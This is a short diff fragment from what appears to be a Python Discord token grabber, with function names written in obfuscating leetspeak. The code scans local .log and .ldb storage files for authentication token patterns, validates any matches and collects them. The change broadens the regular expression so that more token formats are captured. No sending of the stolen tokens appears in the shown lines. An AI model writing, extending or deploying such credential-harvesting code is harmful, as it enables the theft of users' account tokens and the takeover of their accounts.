@@ -575,7 +575,7 @@ def G3770K3N(path, arg):
     for file in os.listdir(path):
         if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
-                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                for regex in (r"[\w-]{20,28}\.[\w-]{4,8}\.[\w-]{20,110}", r"mfa\.[\w-]{80,95}"):
                     for token in re.findall(regex, line):
                         global T0K3Ns
                         if CH3CK70K3N(token):
